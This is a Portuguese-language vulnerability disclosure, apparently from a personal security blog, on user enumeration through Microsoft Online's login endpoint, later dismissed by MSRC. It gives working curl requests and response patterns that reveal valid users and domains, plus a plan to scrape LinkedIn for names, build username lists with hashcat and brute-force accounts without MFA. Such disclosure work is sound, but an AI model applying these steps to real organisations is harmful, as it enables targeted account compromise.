<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
      <title>Divulga&#231;&#227;o de Vulnerabilidade: Enumera&#231;&#227;o de Usu&#225;rios no Servi&#231;o de Autentica&#231;&#227;o do Microsoft Online | por Raphael Moreira </title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta name="title" content="Divulga&#231;&#227;o de Vulnerabilidade: Enumera&#231;&#227;o de Usu&#225;rios no Servi&#231;o de Autentica&#231;&#227;o do Microsoft Online | por Raphael Moreira ">
      
      
      <link rel="icon" href="../../../favicon.ico">
      <link rel="stylesheet" href="../../../public/docfx.min.css">
      <link rel="stylesheet" href="../../../public/main.css">
      <meta name="docfx:navrel" content="../../../toc.html">
      <meta name="docfx:tocrel" content="../../toc.html">
      
      <meta name="docfx:rel" content="../../../">
      
      
      <meta name="docfx:docurl" content="https://github.com/raphaelmoreira/raphaelmoreira/blob/main/tool/docfx_project/aegis/divulgacao/microsoft/vulnerabilidade-enumeracao-usuarios-loginmicrosoftonline.md/#L1">
      <meta name="loc:inThisArticle" content="In this article">
      <meta name="loc:searchResultsCount" content="{count} results for &quot;{query}&quot;">
      <meta name="loc:searchNoResults" content="No results for &quot;{query}&quot;">
      <meta name="loc:tocFilter" content="Filter by title">
      <meta name="loc:nextArticle" content="Next">
      <meta name="loc:prevArticle" content="Previous">
      <meta name="loc:themeLight" content="Light">
      <meta name="loc:themeDark" content="Dark">
      <meta name="loc:themeAuto" content="Auto">
      <meta name="loc:changeTheme" content="Change theme">
      <meta name="loc:copy" content="Copy">
      <meta name="loc:downloadPdf" content="Download PDF">

      <script type="module" src="./../../../public/docfx.min.js"></script>

      <script>
        const theme = localStorage.getItem('theme') || 'auto'
        document.documentElement.setAttribute('data-bs-theme', theme === 'auto' ? (window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light') : theme)
      </script>

  </head>

  <body class="tex2jax_ignore" data-layout="" data-yaml-mime="">
    <header class="bg-body border-bottom">
      <nav id="autocollapse" class="navbar navbar-expand-md" role="navigation">
        <div class="container-xxl flex-nowrap">
          <a class="navbar-brand" href="../../../index.html">
            <img id="logo" class="svg" src="../../../logo.svg" alt="₵&#216;Đł₵Ɇ">
            ₵&#216;Đł₵Ɇ
          </a>
          <button class="btn btn-lg d-md-none border-0" type="button" data-bs-toggle="collapse" data-bs-target="#navpanel" aria-controls="navpanel" aria-expanded="false" aria-label="Toggle navigation">
            <i class="bi bi-three-dots"></i>
          </button>
          <div class="collapse navbar-collapse" id="navpanel">
            <div id="navbar">
              <form class="search" role="search" id="search">
                <i class="bi bi-search"></i>
                <input class="form-control" id="search-query" type="search" disabled="" placeholder="Search" autocomplete="off" aria-label="Search">
              </form>
            </div>
          </div>
        </div>
      </nav>
    </header>

    <main class="container-xxl">
      <div class="toc-offcanvas">
        <div class="offcanvas-md offcanvas-start" tabindex="-1" id="tocOffcanvas" aria-labelledby="tocOffcanvasLabel">
          <div class="offcanvas-header">
            <h5 class="offcanvas-title" id="tocOffcanvasLabel">Table of Contents</h5>
            <button type="button" class="btn-close" data-bs-dismiss="offcanvas" data-bs-target="#tocOffcanvas" aria-label="Close"></button>
          </div>
          <div class="offcanvas-body">
            <nav class="toc" id="toc"></nav>
          </div>
        </div>
      </div>

      <div class="content">
        <div class="actionbar">
          <button class="btn btn-lg border-0 d-md-none" style="margin-top: -.65em; margin-left: -.8em" type="button" data-bs-toggle="offcanvas" data-bs-target="#tocOffcanvas" aria-controls="tocOffcanvas" aria-expanded="false" aria-label="Show table of contents">
            <i class="bi bi-list"></i>
          </button>

          <nav id="breadcrumb"></nav>
        </div>

        <article data-uid="">
<h1 id="divulgação-de-vulnerabilidade-enumeração-de-usuários-no-serviço-de-autenticação-do-microsoft-online">Divulgação de Vulnerabilidade: Enumeração de Usuários no Serviço de Autenticação do Microsoft Online</h1>

<p>Este documento detalha a descoberta de uma vulnerabilidade no serviço de autenticação do <a href="https://login.microsoftonline.com/">Microsoft Online</a>,
o qual permite a enumeração de usuários.</p>
<h2 id="sumário">Sumário</h2>
<p>A vulnerabilidade permite que um atacante remoto descubra nomes válidos de usuários em aplicações que utilizam o serviço
de autenticação do <strong>Microsoft Online</strong>, podendo ser explorado para realização de ataques direcionados.</p>
<p>A descoberta foi comunicada ao <a href="https://msrc.microsoft.com/">Microsoft Security Response Center (MSRC)</a>, sob o <em>external tracking ID</em> <code>microsoft_bounty_1</code>.</p>
<ul>
<li><strong>Data da descoberta</strong>: 26 de Abril de 2024</li>
<li><strong>Data da notificação ao MSRC</strong>: 27 de Abril de 2024</li>
<li><strong>Data da análise pelo MSRC</strong>: 29 de Junho de 2024</li>
<li><strong>Data da conclusão pelo MSRC¹</strong>: 12 de Junho de 2024</li>
</ul>
<blockquote>
<p><strong>¹</strong> a vulnerabilidade foi devidamente relatada seguindo as diretrizes de divulgação responsável para garantir a
mitigação adequada e a proteção de possíveis usuários afetados. Dado que o evento não foi considerado uma vulnerabilidade,
torno público o cenário com o intuito de alinhar entendimento sobre quais contextos a vulnerabilidade aqui citada,
deve ser considerada um risco.</p>
</blockquote>
<h2 id="detalhamento">Detalhamento</h2>
<ul>
<li><strong>Identificador</strong>: CVE-2024-XXXXX¹</li>
<li><strong>Categoria</strong>: Enumeração de Usuários</li>
<li><strong>Gravidade</strong>: Alta</li>
</ul>
<p><em>¹ dado que o item não foi considerado uma ameaça, nenhum código CVE foi atribuído até o momento.</em></p>
<h3 id="descrição">Descrição</h3>
<p>A enumeração de usuários é uma vulnerabilidade de segurança que permite a um atacante descobrir se determinados nomes de usuário
estão presentes em um sistema. Esta vulnerabilidade ocorre quando um aplicativo revela, através de mensagens de erro, respostas
diferentes para usuários existentes e não existentes, durante o processo de autenticação, registro ou recuperação de senha.</p>
<h3 id="impacto">Impacto</h3>
<p>Esta informação, aparentemente inofensiva, pode afetar de forma significativa a segurança da organização, já que a exposição
de credenciais de acesso contribuem para o aumento e eficácia de ataques subsequentes, como <em><strong>phishing</strong></em>, <strong>engenharia social</strong> e
<strong>força bruta</strong>.</p>
<h4 id="-phishing">🔴 Phishing</h4>
<p>Ataque que tenta roubar seu dinheiro ou a sua identidade fazendo com que você revele informações pessoais, tais como números
de cartão de crédito, informações bancárias ou senhas em sites que fingem ser legítimos. Criminosos cibernéticos normalmente
fingem ser empresas confiáveis, amigos ou pessoas conhecidas em uma mensagem de email falsa, que contém um link para
um site de <em>&quot;phishing&quot;</em> (pescar). (Fonte: <a href="https://support.microsoft.com/pt-br/windows/proteja-se-contra-phishing-0c7ea947-ba98-3bd9-7184-430e1f860a44">Suporte Microsoft</a>).</p>
<p>Um subconjunto dessa prática é o <em>spear phishing</em> (pescar na lança), que trata da especialização do ataque, onde os invasores realizam pesquisas
extensas sobre os alvos pretendidos. Essa alta personalização visa não só indivíduos, como empresas específicas, ocasionando
fraudes financeiras, manipulação de preços de ações, espionagem ou roubo de dados confidenciais para revenda. Podem ser
projetados também para infectar dispositivos com <em>malware</em>. (Fonte: <a href="https://www.kaspersky.com.br/resource-center/definitions/spear-phishing">Kaspersky Resource Center</a>)</p>
<h4 id="-engenharia-social">🔴 Engenharia Social</h4>
<p>Os ataques de engenharia social manipulam as emoções e os instintos das pessoas de maneiras que comprovadamente a levam a compartilhar
informações que não deveriam compartilhar, baixar software que não deveriam baixar, visitar sites que não deveriam visitar,
enviar dinheiro para criminosos ou cometer outros erros que comprometam sua segurança pessoal ou organizacional. (Fonte: <a href="https://www.ibm.com/br-pt/topics/social-engineering">IBM Think</a>).</p>
<p>Além dos já citados <em>phishing</em> e <em>spear phishing</em>, temos o <em>baiting</em> (iscar pela curiosidade), <em>tailgating</em> (carona no dispositivo desbloqueado),
<em>pretexting</em> (o falso samaritano digital), <em>Quid pro quo</em> (serviços desejáveis, porém falsos, em troca da informação), <em>scareware</em> (manipular pelo medo)
e <em>watering hole</em> (um serviço real é infectado).</p>
<h4 id="-força-bruta">🔴 Força bruta</h4>
<p>Um ataque de força bruta usa o método de tentativa e erro para adivinhar informações de login, chaves de criptografia ou
encontrar uma página da Web oculta. Invasores trabalham com todas as combinações possíveis na esperança de acertar. (Fonte: <a href="https://www.kaspersky.com.br/resource-center/definitions/brute-force-attac">Kaspersky Resource Center</a>)</p>
<p>Um subtipo dessa forma de ataque é conhecido como <em>Password Spraying</em> (pulverização de senhas), que consiste na tentativa
exaustiva de usar a mesma senha em diversas contas antes de tentar outra. Ataques de pulverização de senhas costumam ser
efetivos, porque muitos usuários, além de usarem as mesmas senhas em diferentes serviços, em geral são de simples memorização
e fáceis de adivinhar. [Fonte: <a href="https://www.kaspersky.com.br/resource-center/definitions/what-is-password-spraying">Kaspersky Resource Center</a>]</p>
<p>Vale destaque aqui para as senhas mais curiosas, utilizadas no Brasil, no ano de 2023:</p>
<table>
<thead>
<tr>
<th>Posição</th>
<th>Senha</th>
<th>Ocorrências</th>
</tr>
</thead>
<tbody>
<tr>
<td>1º</td>
<td>admin</td>
<td>204.846</td>
</tr>
<tr>
<td>2º</td>
<td>123456</td>
<td>137.551</td>
</tr>
<tr>
<td>3º</td>
<td>12345678</td>
<td>46.666</td>
</tr>
<tr>
<td>4º</td>
<td>102030</td>
<td>28.034</td>
</tr>
<tr>
<td>5º</td>
<td>123456789</td>
<td>24.834</td>
</tr>
<tr>
<td>7º</td>
<td>gvt12345</td>
<td>10.684</td>
</tr>
<tr>
<td>9º</td>
<td>password</td>
<td>8687</td>
</tr>
<tr>
<td>11º</td>
<td>123mudar</td>
<td>8202</td>
</tr>
<tr>
<td>15º</td>
<td>fera@123</td>
<td>6364</td>
</tr>
<tr>
<td>20º</td>
<td>Senha</td>
<td>4762</td>
</tr>
</tbody>
</table>
<p>Fonte: <a href="https://nordpass.com/es/most-common-passwords-list/">Nordpass</a></p>
<h3 id="relevância">Relevância</h3>
<p>Políticas robustas de controle de acesso, como multifator ou <em>zero trust</em>, limitam o acesso dos cibercriminosos, mas a falta de
respostas uniformes durante este acesso, abre caminho para a vulnerabilidade de enumeração de usuários, cujo risco é reconhecido
por várias organizações de segurança:</p>
<h4 id="owasp-open-web-application-security-project">OWASP (Open Web Application Security Project)</h4>
<p>Frequentemente mencionada no OWASP Top 10 e citado nas diretrizes do <a href="https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html#authentication-responses">Authentication Cheat Sheet</a>,
podemos destacar aqui suas demais categorias:</p>
<ul>
<li><a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">A1:2021 - Broken Access Control</a></li>
<li><a href="https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/">A7:2021 - Identification and Authentication Failures</a></li>
<li><a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">A9:2017 - Using Components with Known Vulnerabilities</a></li>
</ul>
<h4 id="nist-national-institute-of-standards-and-technology">NIST (National Institute of Standards and Technology)</h4>
<p>A prática é abordada pelo <a href="https://pages.nist.gov/800-63-3/sp800-63b.html">NIST SP 800-63B: Digital Identity Guidelines</a>,
tópico 8: Threats and Security Considerations.</p>
<h4 id="iso-international-organization-for-standardization">ISO (International Organization for Standardization)</h4>
<p>Embora não mencione especificamente a enumeração de usuários, as diretrizes de segurança da <a href="https://www.iso.org/standard/27001">ISO/IEC 27001</a>
e <a href="https://www.iso.org/standard/44378.html">ISO/IEC 27034</a> ressaltam, respectivamente, a importância de proteger informações
de autenticação e adoção de práticas seguras de desenvolvimento.</p>
<h4 id="sei-cert-software-engineering-institute-cert">SEI CERT (Software Engineering Institute CERT)</h4>
<p>O SEI CERT Coding Standards fornece <a href="https://wiki.sei.cmu.edu/confluence/display/seccode/Top+10+Secure+Coding+Practices">10 práticas de codificação segura</a>
para evitar diversas vulnerabilidades. Dentre elas, vale destaque para o item 8: <strong>Practice defense in depth</strong>, cuja orientação
é assegurar mais de uma camada de proteção, combinando técnicas para reduzir as lacunas de segurança.</p>
<h4 id="cve-common-vulnerabilities-and-exposures">CVE (Common Vulnerabilities and Exposures)</h4>
<p>Múltiplas entradas de enumeração de usuários são regularmente catalogadas no banco de dados CVE, como <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5487">WordPress</a>,
<a href="https://nvd.nist.gov/vuln/detail/cve-2016-6210">OpenSSH</a>, <a href="https://nvd.nist.gov/vuln/detail/cve-2021-4191">GitLab</a>.</p>
<ul>
<li><strong>NVD (National Vulnerability Database)</strong>
<ul>
<li>Acrescenta ao CVE informações adicionais, incluindo classificações de risco (CVSS) e detalhes técnicos sobre a enumeração de usuários.</li>
</ul>
</li>
</ul>
<h3 id="vetor-de-ataque">Vetor de Ataque</h3>
<p>A vulnerabilidade foi identificada através de solicitações para o <em>endpoint</em> de autenticação do Microsoft Online, cujo
comportamento das respostas pode revelar a existência de usuários.</p>
<h2 id="método-de-exploração">Método de Exploração</h2>
<p>No portal <a href="https://learn.microsoft.com/en-us/entra/identity/authentication/overview-authentication">Azure AD (Microsoft Entra ID)</a>,
registre uma aplicação através do <a href="https://learn.microsoft.com/en-us/entra/identity-platform/quickstart-register-app?tabs=certificate#register-an-application">App Registration</a>
usando como método o <a href="https://learn.microsoft.com/en-us/entra/identity-platform/access-tokens">Access Token</a>. Conceda as permissões
básicas <code>email</code> e <code>User.Read</code> por meio do <a href="https://developer.microsoft.com/pt-BR/graph/graph-explorer">Microsoft Graph</a>.</p>
<p>A partir desse registro, você obterá o <code>appId</code>, parâmetro essencial para a construção da <strong>url</strong> de autenticação que irá identificá-lo
no serviço, conforme a estrutura abaixo:</p>
<pre><code class="lang-txt">https://login.microsoftonline.com/{appId}/oauth2/v2.0/authorize
</code></pre>
<p>Adicional a isso, incluiremos os parâmetros <code>clientId</code> e <code>code</code>, obtidos durante o fluxo do <em>backend</em>:</p>
<pre><code class="lang-txt">?client_id={clientId}&amp;response_type=code&amp;code_challenge={code}
</code></pre>
<p>Por fim, os parâmetros fixos:</p>
<pre><code class="lang-txt">&amp;code_challenge_method=S256
&amp;redirect_uri=https://minha-aplicacao/successo
&amp;scope=https://graph.microsoft.com/email
&amp;prompt=select_account
&amp;sso_reload=true
</code></pre>
<p>No conjunto, a <strong>url</strong> final será parecido com:</p>
<pre><code class="lang-txt">https://login.microsoftonline.com/{appId}/oauth2/v2.0/authorize?client_id={clientId}&amp;response_type=code&amp;code_challenge={code}&amp;code_challenge_method=S256&amp;redirect_uri=https://my.app/success&amp;scope=https://graph.microsoft.com/email&amp;prompt=select_account&amp;sso_reload=true
</code></pre>
<h3 id="metodologia-visual">Metodologia Visual</h3>
<p>A <strong>url</strong> irá te levar até o serviço de autenticação personalizado da aplicação (appId), informando o inquilino (<code>clientId</code>)
solicitante (tenant), exigindo então as credenciais de acesso.</p>
<table>
<thead>
<tr>
<th>Tela inicial</th>
<th>Informo dados inválidos</th>
<th>Serviço confirma</th>
<th>Domínio correto, a mensagem muda</th>
<th>Usuário correto, é solicitado a senha</th>
</tr>
</thead>
<tbody>
<tr>
<td><img src="../../../images/aegis/divulgacao/microsoft/001-vulnerabilidade-enumeracao-usuarios-loginmicrosoftonline.png" alt=""></td>
<td><img src="../../../images/aegis/divulgacao/microsoft/002-vulnerabilidade-enumeracao-usuarios-loginmicrosoftonline.png" alt=""></td>
<td><img src="../../../images/aegis/divulgacao/microsoft/003-vulnerabilidade-enumeracao-usuarios-loginmicrosoftonline.png" alt=""></td>
<td><img src="../../../images/aegis/divulgacao/microsoft/004-vulnerabilidade-enumeracao-usuarios-loginmicrosoftonline.png" alt=""></td>
<td><img src="../../../images/aegis/divulgacao/microsoft/005-vulnerabilidade-enumeracao-usuarios-loginmicrosoftonline.png" alt=""></td>
</tr>
</tbody>
</table>
<p>A partir de uma conferência simples das mensagens de erro, sou capaz de enumerar tanto usuários quanto domínios.</p>
<h3 id="metodologia-programática">Metodologia Programática</h3>
<p>Inspecionando o código-fonte do serviço <a href="https://login.microsoftonline.com">https://login.microsoftonline.com</a>, e analisando os pacotes enviados pela rede,
encontramos o <em>endpoint</em> <code>GetCredentialType</code>. Ao extrair o corpo da requisição, temos isso:</p>
<pre><code>curl --location 'https://login.microsoftonline.com/common/GetCredentialType?mkt=pt-BR' \
--header 'accept: application/json' \
--header 'accept-language: pt-BR,pt;q=0.7' \
--header 'canary: {canaryHash}' \
--header 'client-request-id: {requestGuid}' \
--header 'content-type: application/json; charset=UTF-8' \
--header 'cookie: brcap=0; ESTSSSOTILES=1; AADSSOTILES=1; x-ms-gateway-slice=estsfd; stsservicecookie=estsfd; AADSSO=NA|NoExtension; ESTSAUTHLIGHT=+58498593-a7a2-422b-84bd-ef0fb1c85b0d; CCState={cstateHash}' \
--header 'hpgact: 1800' \
--header 'hpgid: 1104' \
--header 'hpgrequestid: {hpgRequestGuid}' \
--header 'origin: https://login.microsoftonline.com' \
--header 'priority: u=1, i' \
--header 'referer: https://login.microsoftonline.com/{appId}/oauth2/v2.0/authorize?client_id={clientId}&amp;response_type=code&amp;code_challenge={code}&amp;code_challenge_method=S256&amp;redirect_uri=https://minha-aplicacao/successo&amp;scope=https://graph.microsoft.com/email&amp;prompt=select_account&amp;sso_reload=true
--header 'sec-ch-ua: &quot;Brave&quot;;v=&quot;125&quot;, &quot;Chromium&quot;;v=&quot;125&quot;, &quot;Not.A/Brand&quot;;v=&quot;24&quot;' \
--header 'sec-ch-ua-mobile: ?0' \
--header 'sec-ch-ua-platform: &quot;Windows&quot;' \
--header 'sec-fetch-dest: empty' \
--header 'sec-fetch-mode: cors' \
--header 'sec-fetch-site: same-origin' \
--header 'sec-gpc: 1' \
--header 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36' \
--data-raw '{&quot;username&quot;:&quot;abacate@avocado.com.br&quot;,&quot;isOtherIdpSupported&quot;:true,&quot;checkPhones&quot;:false,&quot;isRemoteNGCSupported&quot;:true,&quot;isCookieBannerShown&quot;:false,&quot;isFidoSupported&quot;:true,&quot;originalRequest&quot;:&quot;{originalRequestHash}&quot;,&quot;country&quot;:&quot;BR&quot;,&quot;forceotclogin&quot;:false,&quot;isExternalFederationDisallowed&quot;:false,&quot;isRemoteConnectSupported&quot;:false,&quot;federationFlags&quot;:0,&quot;isSignup&quot;:false,&quot;flowToken&quot;:&quot;{flowToken}&quot;,&quot;isAccessPassSupported&quot;:true}'
</code></pre>
<p>Embora o conjunto de cabeçalhos e parâmetros sejam elevados, alguns deles sugerem ter algum tratamento seguro quanto ao envio,
como é o caso do <code>requestGuid</code>, <code>cstateHash</code>, <code>hpgRequestGuid</code>, <code>originalRequestHash</code> ou <code>flowToken</code>. Contudo, nenhum deles é
de fato necessário na requisição.</p>
<p>Uma vez que não há verificação dessas partes, nem consistência do objeto quanto a sua manipulação, podemos enxugá-lo:</p>
<pre><code class="lang-txt">curl --location 'https://login.microsoftonline.com/common/GetCredentialType?mkt=pt-BR' \
--header 'Content-Type: application/json' \
--header 'Cookie: fpc=Avu1jfhsb2hEhMRueZ1yZ9Q; stsservicecookie=estsfd; x-ms-gateway-slice=estsfd' \
--data-raw '{  
    &quot;username&quot;: &quot;abacate@avocado.com.br&quot;
}'
</code></pre>
<p>Independente de qual formato você use, ambos irão retornar a seguinte estrutura:</p>
<pre><code class="lang-json">{
    &quot;Username&quot;: &quot;&quot;,
    &quot;Display&quot;: &quot;&quot;,
    &quot;IfExistsResult&quot;: 0,
    &quot;IsUnmanaged&quot;: false,
    &quot;ThrottleStatus&quot;: 0,
    &quot;Credentials&quot;: {},
    &quot;DfpProperties&quot;: {},
    &quot;EstsProperties&quot;: {},
    &quot;IsSignupDisallowed&quot;: false,
    &quot;apiCanary&quot;: &quot;&quot;
}
</code></pre>
<p>Mais uma vez, não precisamos nos concentrar no excesso, portanto, vamos mirar apenas nos campos <code>IfExistisResult</code> (<em>garante a existência</em>) e
<code>ThrottleStatus</code> (<em>algum tipo de erro</em>). Automatizando essas requisições, encontramos o seguinte padrão:</p>
<ul>
<li>Se <strong>usuário</strong> e <strong>domínio</strong> <u>não</u> existirem, <code>IfExistisResult</code> e <code>ThrottleStatus</code> serão <code>1</code>;</li>
<li>Se <strong>usuário</strong> <u>não</u> existir, mas o <strong>domínio</strong> existir, <code>IfExistisResult</code> será <code>1</code> e <code>ThrottleStatus</code> será <code>0</code>;</li>
<li>Se <strong>usuário</strong> e <strong>domínio</strong> existem, <code>IfExistisResult</code> e <code>ThrottleStatus</code> serão <code>0</code>;</li>
</ul>
<p>Com isso, verificamos pela segunda vez que é possível identificar usuários através do serviço.</p>
<p><em>Obs: há outras mudanças no <code>json</code> que colaboram com a identificação, mas optei pelos itens acima por brevidade.</em></p>
<h3 id="metodologia-expandida">Metodologia Expandida</h3>
<p>Considerando que o serviço <a href="https://azure.microsoft.com/pt-br/products/devops">Azure DevOps</a> também usa o Microsoft Online, e sua <strong>url</strong> é acessível através de <code>https://dev.azure.com/{nomeDaOrganizacao}</code>,
podemos fazer um <em>web scrapping</em> numa rede social, como o LinkedIn, e obter o nome principal de cada empresa.</p>
<p>Com isso, testamos até obter um <strong>HttpStatus</strong> <code>200</code>:</p>
<pre><code>https://dev.azure.com/mcdonalds
https://dev.azure.com/samsung
https://dev.azure.com/ibm
https://dev.azure.com/suaempresa
...
https://dev.azure.com/microsoft
</code></pre>
<p>Após encontrar o alvo, basta aplicar qualquer uma das metodologias descritas:</p>
<table>
<thead>
<tr>
<th>Usuário não existe no domínio</th>
<th>Usuário existe e me é solicitado a senha</th>
</tr>
</thead>
<tbody>
<tr>
<td><img src="../../../images/aegis/divulgacao/microsoft/006-vulnerabilidade-enumeracao-usuarios-loginmicrosoftonline.png" alt=""></td>
<td><img src="../../../images/aegis/divulgacao/microsoft/007-vulnerabilidade-enumeracao-usuarios-loginmicrosoftonline.png" alt=""></td>
</tr>
</tbody>
</table>
<p>Além de nomes óbvios como o demonstrado acima, podemos fazer outro <em>web scrapping</em> no LinkedIn, porém focado nos funcionários da
empresa alvo. A partir dos nomes e sobrenomes, é possível gerar todas as combinações (<em>incluindo hífen, underscore ou ponto</em>)
através do <strong>hashcat</strong>. Com a massa de dados pronta, basta deixar a força bruta agir através do <software>.</software></p>
<p>Aquele usuário que não tiver um 2º fator de segurança, fatalmente estará sujeito a ter suas credenciais quebradas.</p>
<h2 id="mitigação-e-recomendações">Mitigação e Recomendações</h2>
<p>Dentre as organizações e padrões de segurança existente, cito abaixo as que identificam a enumeração de usuários como uma
vulnerabilidade de risco:</p>
<ul>
<li>Respostas Uniformes: implementar respostas de erro padronizadas sem revelando detalhes sobre sua existência.</li>
<li>Verificações contra adulteração: avaliações robustas na requisição devem garantir que o evento não possa ser explorado.</li>
<li>Rate Limiting: aplicar limites de taxa em tentativas de login para dificultar a exploração automatizada.</li>
<li>Monitoramento e Auditoria: registrar tentativas de login falhadas para identificar possíveis atividades suspeitas.</li>
</ul>
<h2 id="referências">Referências</h2>
<ul>
<li>ISO 27034-1: Information technology — Security techniques — Application security — Part 1: Overview and concepts</li>
<li>SEI CERT Coding Standard for C</li>
<li>OWASP Authentication Cheat Sheet</li>
<li>NIST SP 800-63B: Digital Identity Guidelines</li>
</ul>
<h2 id="conclusão">Conclusão</h2>
<p>A descoberta desta vulnerabilidade no serviço de autenticação do Microsoft Online ressalta a importância contínua de revisões
de segurança e conformidade com padrões internacionais. A mitigação rápida e eficaz é crucial para proteger os usuários e
prevenir exploração maliciosa.</p>
<p>A vulnerabilidade foi identificada através de uma análise de segurança seguindo
os padrões <a href="https://owasp.org/">OWASP</a>, <a href="https://www.nist.gov/cyberframework">NIST</a>, <a href="https://www.iso.org/standard/44378.html">ISO 27034</a> e
<a href="https://wiki.sei.cmu.edu/confluence/display/seccode">SEI CERT Coding Standard</a>.</p>

</article>

        <div class="contribution d-print-none">
          <a href="https://github.com/raphaelmoreira/raphaelmoreira/blob/main/tool/docfx_project/aegis/divulgacao/microsoft/vulnerabilidade-enumeracao-usuarios-loginmicrosoftonline.md/#L1" class="edit-link">Edit this page</a>
        </div>

        <div class="next-article d-print-none border-top" id="nextArticle"></div>

      </div>

      <div class="affix">
        <nav id="affix"></nav>
      </div>
    </main>

    <div class="container-xxl search-results" id="search-results"></div>

    <footer class="border-top text-secondary">
      <div class="container-xxl">
        <div class="flex-fill">
          <span>Made with <a href="https://dotnet.github.io/docfx">docfx</a></span>
        </div>
      </div>
    </footer>
  </body>
</html>
